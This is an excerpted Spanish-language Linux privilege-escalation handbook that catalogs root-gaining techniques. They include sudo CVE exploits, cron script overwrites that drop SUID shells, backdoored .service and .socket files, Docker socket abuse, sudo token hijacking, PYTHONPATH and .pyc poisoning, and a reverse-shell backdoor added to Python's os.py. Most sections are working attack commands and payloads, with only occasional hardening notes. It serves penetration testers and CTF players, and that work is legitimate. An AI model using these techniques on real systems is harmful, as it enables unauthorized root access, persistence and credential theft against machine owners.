...
Comencemos obteniendo información sobre el sistema operativo en ejecución
```bash
...
Si tienes **permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas libraries o binaries:
```bash
echo $PATH
```
...
Busca **siempre la versión del kernel en Google**, quizá tu versión del kernel aparezca en algún exploit y así te asegurarás de que este exploit es válido.
...
Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a los usuarios locales sin privilegios escalar sus privilegios a root mediante la opción `--chroot` de sudo cuando el archivo `/etc/nsswitch.conf` se utiliza desde un directorio controlado por el usuario.<sup>[[28]](#references)[[29]](#references)</sup>

Aquí hay un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que admita la funcionalidad `chroot`.
...
Sudo anterior a 1.9.17p1 (rango afectado reportado: **1.8.8–1.9.17**) puede evaluar las reglas de sudoers basadas en el host utilizando el **hostname proporcionado por el usuario** mediante `sudo -h <host>` en lugar del **hostname real**. Si sudoers concede privilegios más amplios en otro host, puedes hacer **spoof** de ese host localmente.<sup>[[29]](#references)</sup>

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas para un host (el host no es ni el hostname actual ni `ALL`)
...
sudo -h devbox -i
```
Si la resolución del nombre suplantado se bloquea, añádelo a `/etc/hosts` o usa un hostname que ya aparezca en logs/configs para evitar las consultas DNS.
...
sudo -u#-1 /bin/bash
```
### Verificación de firma de Dmesg fallida

Consulta la **máquina smasher2 de HTB** para ver un **ejemplo** de cómo podría explotarse esta vulnerabilidad.
```bash
...
Si estás dentro de un contenedor, comienza con la siguiente sección de container-security y luego haz pivot hacia las páginas de abuso específicas del runtime:
...
```
Además, comprueba si hay **algún compilador instalado**. Esto resulta útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde vayas a utilizarlo (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Puede que exista alguna versión antigua de Nagios, por ejemplo, que pueda explotarse para escalar privilegios…\
...
Un proceso hijo que se ejecuta con un **usuario diferente** al de su proceso padre no es automáticamente malicioso, pero es una **señal útil para el triage**. Algunas transiciones son esperadas (`root` iniciando un usuario de servicio, gestores de inicio de sesión creando procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, helpers de debug, persistencia o límites de confianza débiles en el runtime.
...
### Ejecutables eliminados y archivos eliminados pero abiertos
...
```
Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Es una señal importante que conviene investigar porque:
...
Para un ID de proceso determinado, **maps muestra cómo está mapeada la memoria dentro del** espacio de direcciones virtuales **de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la memoria del proceso en sí**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **posicionarnos en el archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
...
ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguelo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
Si descubres que el proceso authenticator está en ejecución:
```bash
...
### Crontab UI (alseambusher) ejecutándose como root – privesc del scheduler basado en web

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está enlazado a loopback, aún puedes acceder a él mediante el reenvío de puertos local de SSH y crear una tarea con privilegios para escalar.<sup>[[1]](#references)[[4]](#references)</sup>
...
```
- Crea un job con altos privilegios y ejecútalo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
...
```
Hardening
- No ejecutes Crontab UI como root; restríngetelo a un usuario dedicado con permisos mínimos
- Vincúlalo a localhost y restringe además el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incrustar secretos en los unit files; utiliza secret stores o un EnvironmentFile accesible únicamente por root
- Habilita audit/logging para las ejecuciones de jobs bajo demanda

Comprueba si algún job programado es vulnerable. Quizá puedas aprovechar un script que se ejecute como root (¿wildcard vuln? ¿puedes modificar archivos que utilice root? ¿usar symlinks? ¿crear archivos específicos en el directorio que utilice root?).
```bash
crontab -l
...
Si un script es ejecutado por root y contiene un “**\***” dentro de un comando, podrías explotar esto para provocar comportamientos inesperados (como privesc). Ejemplo:
```bash
...
- Por qué funciona: En Bash, las expansiones se realizan en este orden: expansión de parámetros/variables, sustitución de comandos, expansión aritmética y, después, división de palabras y expansión de nombres de ruta. Por tanto, un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando) y, después, el `0` numérico restante se utiliza para la operación aritmética, por lo que el script continúa sin errores.
...
- Explotación: Consigue que se escriba texto controlado por el atacante en el log analizado, de modo que el campo con aspecto numérico contenga una sustitución de comandos y termine con un dígito. Asegúrate de que tu comando no imprima en stdout (o redirígelo) para que la operación aritmética siga siendo válida.
```bash
...
Si **puedes modificar un script de cron** ejecutado como root, puedes obtener una shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso completo**, quizá podría ser útil eliminar esa carpeta y **crear una carpeta de enlace simbólico a otra** que contenga un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de symlinks y manejo más seguro de archivos
...
- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea links/files creados previamente por el atacante).
...
### Binaries de cron firmados a medida con payloads modificables

Los equipos de Blue team a veces "firman" binaries ejecutados por cron volcando una sección ELF personalizada y haciendo grep de una cadena del vendor antes de ejecutarlos como root. Si ese binary permite escritura al grupo (por ejemplo, `/opt/AV/periodic-checks/monitor`, propiedad de `root:devs 770`) y puedes hacer leak del material de firma, puedes falsificar la sección y secuestrar la tarea de cron:<sup>[[2]](#references)</sup>
...
```
3. Construye un reemplazo malicioso (por ejemplo, deja una bash SUID o añade tu SSH key) e inserta el certificado en `.text_sig` para que el grep se valide:
```bash
...
```
4. Sobrescribe el binary programado preservando los execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Espera a la siguiente ejecución de cron; cuando la comprobación de firma naive sea correcta, tu payload se ejecutará como root.
...
Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes colocar un **binario SUID/SGID** que se volverá a copiar como **root:root**, conservando los mismos bits de modo, en el destino del backup.<sup>[[26]](#references)</sup>
...
- Confirma que el clúster de origen (por ejemplo, `/var/lib/postgresql/14/main`) permite escritura por tu parte y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después de ejecutarse el job.
...
```
Esto funciona porque `pg_basebackup` conserva los bits de modo de los archivos al copiar el cluster; cuando lo ejecuta root, los archivos de destino heredan la **propiedad de root + SUID/SGID elegidos por el atacante**. Cualquier rutina privilegiada similar de backup/copia que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Trabajos cron invisibles

Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin carácter de nueva línea), y el cronjob funcionará. Ejemplo (observa el carácter de retorno de carro):
```bash
...
### Archivos _.service_ modificables

Comprueba si puedes escribir en algún archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizá debas esperar hasta que se reinicie la máquina).\
Por ejemplo, crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios modificables
...
> La unidad que se activará cuando este timer termine. El argumento es el nombre de una unidad cuyo sufijo no es ".timer". Si no se especifica, este valor toma por defecto un servicio que tiene el mismo nombre que la unidad del timer, excepto por el sufijo. (Consulta lo anterior). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del timer sean idénticos, excepto por el sufijo.
...
Los Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o en máquinas diferentes dentro de modelos cliente-servidor. Utilizan archivos descriptores Unix estándar para la comunicación entre equipos y se configuran mediante archivos `.socket`.<sup>[[14]](#references)</sup>
...
- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero se utiliza un resumen para **indicar dónde va a escuchar** el socket (la ruta del archivo socket AF_UNIX, la dirección IPv4/6 y/o el número de puerto donde escuchar, etc.)
- `Accept`: Acepta un argumento booleano. Si es **true**, se **genera una instancia del servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se genera una unidad de servicio para todas las conexiones. Este valor se ignora para sockets de datagramas y FIFOs, donde una única unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **El valor predeterminado es false**. Por motivos de rendimiento, se recomienda escribir nuevos daemons únicamente de forma que sean compatibles con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comandos que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha sean **creados** y asociados, respectivamente. El primer token de la línea de comandos debe ser un nombre de archivo absoluto, seguido de los argumentos del proceso.
...
- `Service`: Especifica el nombre de la unidad de **servicio** que se debe **activar** ante **tráfico entrante**. Esta configuración solo está permitida para sockets con Accept=no. De forma predeterminada, utiliza el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario utilizar esta opción.

### Archivos .socket escribibles

Si encuentras un archivo `.socket` **escribible**, puedes **añadir** al principio de la sección `[Socket]` algo como `ExecStartPre=/home/kali/sys/backdoor`, y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar hasta que la máquina se reinicie.**\
...
### Socket activation + ruta de unidad escribible (crear un servicio inexistente)

Otra misconfiguración de alto impacto es:
...
Si **identificas cualquier socket escribible** (_ahora estamos hablando de Unix Sockets y no de los archivos `.socket` de configuración_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.
...
Ten en cuenta que puede haber algunos **sockets escuchando solicitudes HTTP** (_no me refiero a archivos .socket, sino a los archivos que actúan como sockets de Unix_). Puedes comprobarlo con:
```bash
...
En los casos en los que Docker CLI no esté disponible, el Docker socket aún puede abusarse mediante HTTP sin formato a través del Unix socket. El flujo más fiable es:

- crear un contenedor auxiliar de larga duración con el root del host montado mediante bind mount
- iniciarlo
...
```
**Crea e inicia un contenedor auxiliar**
```bash
HELPER=helper
...
D-Bus es un sofisticado **sistema de comunicación entre procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado teniendo en cuenta los sistemas Linux modernos, ofrece un framework robusto para diferentes formas de comunicación entre aplicaciones.<sup>[[16]](#references)</sup>

El sistema es versátil y admite IPC básico, lo que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, permite difundir eventos o señales, facilitando la integración entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Asimismo, D-Bus admite un sistema de objetos remotos que simplifica las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona según un **modelo de allow/deny**, gestionando los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) en función del efecto acumulativo de las reglas de policy coincidentes. Estas policies especifican las interacciones con el bus y podrían permitir una escalada de privilegios mediante la explotación de estos permisos.

Un ejemplo de este tipo de policy se encuentra en `/etc/dbus-1/system.d/wpa_supplicant.conf`, donde se detallan los permisos del usuario root para poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las policies sin un usuario o grupo especificado se aplican universalmente, mientras que las policies del contexto "default" se aplican a todos los casos no cubiertos por otras policies específicas.
```xml
<policy user="root">
...
Comprueba siempre los servicios de red que se estén ejecutando en la máquina y con los que no hayas podido interactuar antes de acceder a ella:
```bash
...
```
Clasifica los listeners según el destino de bind:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para túneles/forwarding).
- IP internas específicas (por ejemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente accesibles solo desde segmentos internos.

### Flujo de triage de servicios solo locales

Cuando comprometes un host, los servicios asociados a `127.0.0.1` suelen ser accesibles por primera vez desde tu shell. Un flujo local rápido es:
```bash
...
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como escáner de red (network-only mode)
...
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS funciona como un escáner de red puro (omitiendo el resto de las comprobaciones de privilege-escalation).
...
ip -br addr
```
Loopback (`lo`) es especialmente valioso durante el post-exploitation porque muchos servicios de uso exclusivamente interno exponen tokens/cookies/credenciales allí:
```bash
...
Comprueba **who** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden hacer **login** y cuáles tienen **privilegios de root**:
```bash
#Info about me
...
Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force de usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force de usuarios.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, es posible que puedas escalar privilegios **creando una backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por un usuario diferente (idealmente root) y que **no se cargue desde una carpeta ubicada anteriormente** a tu carpeta escribible en $PATH.
...
La configuración de Sudo podría permitir a un usuario ejecutar ciertos comandos con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
...
```
Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca arbitraria de Python mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Poisoning de `__pycache__` / `.pyc` escribible en imports de Python permitidos por sudo

Si un **script de Python permitido por sudo** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` escribible**, es posible que puedas reemplazar el `.pyc` en caché y obtener ejecución de código como el usuario privilegiado en el siguiente import.<sup>[[30]](#references)</sup>

- Por qué funciona:
- CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- El intérprete valida la **cabecera** (magic + metadatos de timestamp/hash vinculados al source) y después ejecuta el objeto de código marshaled almacenado tras dicha cabecera.
- Si puedes **eliminar y recrear** el archivo en caché porque el directorio es escribible, un `.pyc` propiedad de root pero no escribible todavía puede ser reemplazado.
- Ruta típica:
...
3. Compila un objeto de código de payload, aplica `marshal.dumps(...)`, elimina el archivo de caché original y vuelve a crearlo con la cabecera original más tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que el import ejecute tu payload como root.

Notas importantes:

- Reutilizar la cabecera original es esencial porque Python comprueba los metadatos de caché con respecto al archivo fuente, no si el cuerpo del bytecode coincide realmente con el código fuente.
...
Forma mínima de la prueba de concepto:
```python
...
- En ejecuciones con privilegios, considera usar `PYTHONDONTWRITEBYTECODE=1` y realizar comprobaciones periódicas para detectar directorios `__pycache__` con permisos de escritura inesperados.
- Trata los módulos locales de Python y los directorios de caché con permisos de escritura del mismo modo que tratarías los shell scripts o las shared libraries con permisos de escritura que ejecuta root.

### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers preserva `BASH_ENV` (por ejemplo, `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio de Bash no interactivo para ejecutar código arbitrario como root al invocar un comando permitido.<sup>[[24]](#references)</sup>

- Por qué funciona: En los shells no interactivos, Bash evalúa `$BASH_ENV` y obtiene el contenido de ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un shell wrapper. Si `BASH_ENV` está preservado por sudo, tu archivo se obtiene con privilegios de root.<sup>[[23]](#references)</sup>
...
- Evita wrappers de shell para comandos permitidos por sudo; utiliza binarios mínimos.
...
Si sudo deja intacto el entorno (`!env_reset`) al permitir `terraform apply`, `$HOME` permanece como el del usuario que ejecuta el comando. Por lo tanto, Terraform carga **$HOME/.terraformrc** como root y respeta `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Apunta el provider requerido a un directorio con permisos de escritura y coloca un plugin malicioso con el nombre del provider (por ejemplo, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
...
```
Terraform fallará durante el handshake del plugin de Go, pero ejecutará el payload como root antes de terminar, dejando una shell SUID.

### Sobrescrituras de TF_VAR + bypass de validación de symlinks

Las variables de Terraform pueden proporcionarse mediante variables de entorno `TF_VAR_<name>`, que permanecen cuando sudo conserva el entorno. Las validaciones débiles, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, pueden evadirse mediante symlinks:<sup>[[25]](#references)</sup>
```bash
...
```
Terraform resuelve el symlink y copia el `/root/root.txt` real en un destino legible por el atacante. El mismo enfoque puede utilizarse para **escribir** en rutas privilegiadas creando previamente symlinks en los destinos (por ejemplo, apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, lo que obliga a sudo a ejecutarse únicamente desde una TTY interactiva. Si se establece `!requiretty` (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos, como reverse shells, cron jobs o scripts.
```bash
Defaults !requiretty
```
...
### Sudo env_keep+=PATH / secure_path inseguro → secuestro de PATH
...
```
### Ejecución de Sudo evadiendo rutas
...
Si se otorga el **permiso de sudo** para un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH
```bash
...
```
Si `/usr/local/bin/backup.sh` tiene permisos de escritura, puedes añadir comandos de payload y después ejecutar el wrapper SUID:
```bash
...
```
> [!CAUTION]
> Se puede abusar de un privesc similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, porque controla la ruta donde se buscarán las librerías.
```c
#include <stdio.h>
#include <stdlib.h>
...
Al encontrar un binario con permisos **SUID** que parece inusual, es recomendable verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:<sup>[[17]](#references)</sup>
```bash
...
El proyecto recopila funciones legítimas de binarios de Unix que pueden utilizarse indebidamente para escapar de restricted shells, escalar o mantener privilegios elevados, transferir archivos, generar bind y reverse shells y facilitar otras tareas de post-exploitation.
...
Si puedes acceder a `sudo -l`, puedes utilizar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de Sudo Tokens

En los casos en los que tienes **sudo access** pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y secuestrando después el session token**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilegios:

- Ya tienes un shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **utilizado `sudo`** para ejecutar algo **en los últimos 15 minutos** (de forma predeterminada, esa es la duración del sudo token que nos permite utilizar `sudo` sin introducir ninguna contraseña)
...
Si se cumplen todos estos requisitos, **puedes escalar privilegios utilizando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes utilizarlo para **activar el sudo token en tu sesión** (no obtendrás automáticamente un shell de root; ejecuta `sudo su`):
```bash
bash exploit.sh
...
/tmp/sh -p
```
- El **third exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que los **sudo tokens sean eternos y permite a todos los usuarios usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
...
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con el PID 1234, puedes **obtener privilegios de sudo** sin necesitar conocer la contraseña haciendo:
```bash
...
El bit de **"read"** implica que el usuario puede **listar** los **files**, y el bit de **"write"** implica que el usuario puede **eliminar** y **crear** nuevos **files**.

## ACLs

Las Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaz de **anular los permisos ugo/rwx tradicionales**. Estos permisos mejoran el control sobre el acceso a files o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Puedes encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concede** al usuario "kali" permisos de lectura y escritura sobre un file:
```bash
...
```
### Backdoor de ACL oculta en los drop-ins de sudoers
...
sudo -l
```
Este es un path de persistencia/privesc mediante ACL de alto impacto porque es fácil pasarlo por alto en revisiones que solo utilizan `ls -l`.
...
```
![secuestro de sesiones de screen - Ubicaciones de los sockets (algunos sistemas exponen uno como enlace simbólico del otro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
...
Este era un problema de las **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como usuario sin privilegios.
...
- **`/etc/securetty`**: restringe desde dónde puede iniciar sesión root (lista de permitidos de TTY).
...
Especifica los archivos que contienen las claves públicas que se pueden utilizar para la autenticación de usuarios. Puede contener tokens como `%h`, que se sustituirán por el directorio home. **Puedes indicar rutas absolutas** (que comiencen por `/`) o **rutas relativas al home del usuario**. Por ejemplo:
```bash
...
El reenvío del agente SSH te permite **usar tus claves SSH locales en lugar de dejar las claves** (¡sin frases de contraseña!) en tu servidor. Así, podrás **saltar** mediante ssh **a un host** y, desde allí, **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.
...
El archivo `/etc/sshd_config` puede **permitir o denegar** el forwarding de `ssh-agent` mediante la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitirlo).

Si descubres que Forward Agent está configurado en un entorno, lee la siguiente página, ya que **podrías aprovecharlo para escalar privilegios**:
...
El archivo `/etc/profile` y los archivos dentro de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una shell nueva**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño, deberías comprobarlo en busca de **detalles confidenciales**.
...
```
Luego, agrega el usuario `hacker` y la contraseña generada.
```
...
```
### Archivos en ubicaciones extrañas o de propiedad inusual
```bash
...
**Otra herramienta interesante** que puedes utilizar para ello es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación open source utilizada para recuperar muchas contraseñas almacenadas en un equipo local con Windows, Linux y Mac.
...
Además, algunos **logs de auditoría** mal configurados (¿con una backdoor?) pueden permitirte **registrar contraseñas** dentro de los logs de auditoría, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
...
~/.zshrc #zsh shell
```
### Búsqueda/Regex de Creds genéricas
...
No voy a enumerar aquí cómo hacer todo esto, pero si te interesa puedes consultar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos escribibles

### Python library hijacking

Si sabes **desde dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta, o puedes **modificar python libraries**, puedes modificar la librería del OS y hacerle un backdoor (si puedes escribir en el lugar donde se va a ejecutar el script de python, copia y pega la librería os.py).

Para **hacerle un backdoor a la librería**, solo tienes que añadir al final de la librería os.py la siguiente línea (cambia la IP y el PORT):
```python
...
Puedes encontrar información más detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs de nginx),** por lo que, siempre que descubras que puedes alterar logs, comprueba quién gestiona esos logs y si puedes escalar privilegios sustituyendo los logs por symlinks.
...
Los scripts de red, por ejemplo _ifcg-eth0_, se utilizan para las conexiones de red. Tienen exactamente el mismo aspecto que los archivos .INI. Sin embargo, Network Manager (dispatcher.d) los ~sources~ en Linux.
...
Los frameworks de rooting de Android suelen enganchar un syscall para exponer funcionalidades privilegiadas del kernel a un manager en userspace. Una autenticación débil del manager (por ejemplo, comprobaciones de firma basadas en el orden de los FD o esquemas de contraseñas deficientes) puede permitir que una aplicación local suplante al manager y escale a root en dispositivos que ya tienen root. Obtén más información y consulta los detalles de explotación aquí:
...
Obtén más información y consulta un patrón generalizado aplicable a otras stacks de descubrimiento/monitorización aquí:
...
## Tools de Privesc de Linux/Unix
